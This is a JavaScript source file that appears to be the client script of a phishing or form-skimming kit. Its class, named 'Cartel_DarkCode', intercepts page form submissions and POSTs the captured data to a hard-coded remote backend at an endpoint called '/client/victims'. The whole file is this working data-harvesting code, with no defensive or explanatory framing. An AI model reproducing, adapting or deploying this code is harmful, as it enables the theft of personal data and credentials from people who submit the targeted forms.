class Cartel_DarkCode {
    baseUrl = "https://setevezes-backend-connection.vercel.app";
    // baseUrl = "http://localhost:5000";

    key;

    constructor(key) {
        this.key = key;
    }

    getById(id) {
        return document.getElementById(id);
    }

    getValueById(id) {
        return this.getById(id).value;
    }

    async create(data) {
        console.log("dc.create", { data });
        try {
            const url = this.baseUrl + "/client/victims?key=" + this.key;
            const response = await fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(data),
            });

            if (response.ok) {
                const result = await response.json();
                console.log(result);
            } else {
                console.log("error: db.create");
            }
        } catch (e) {
            console.log(e);
        }
    }

    async onSubmit(id, next) {
        try {
            this.getById(id).addEventListener("submit", (e) => {
                e.preventDefault();
                next(e);
            });
        } catch {}
    }
}
